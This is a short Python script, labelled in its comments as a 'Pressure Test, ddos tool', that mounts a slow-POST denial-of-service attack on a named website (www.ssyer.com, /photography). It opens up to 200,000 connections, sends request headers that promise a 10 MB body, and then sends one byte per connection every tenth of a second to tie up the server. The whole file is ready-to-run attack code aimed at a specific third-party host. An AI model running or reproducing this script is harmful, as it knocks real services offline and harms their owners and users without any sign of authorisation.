#!/usr/bin/env python
import socket
import time
import threading

# Pressure Test,ddos tool
# ---------------------------
MAX_CONN = 200000    # 最大socket链接量
PORT = 80
HOST = "www.ssyer.com"
PAGE = "/photography"
# ---------------------------

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))

# 创建socket链接列表，存储上20万个socket
socks = []
# 循环创建socket链接
def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode("utf-8"))
            print("Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("Could not connect to server or send error:%s" % ex)
            time.sleep(1)


# socket循环对目标网站发数据
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode("utf-8"))
                print("send f OK!")
            except Exception as ex:
                print("Send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(0.1)

# 多线程执行两个函数
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()
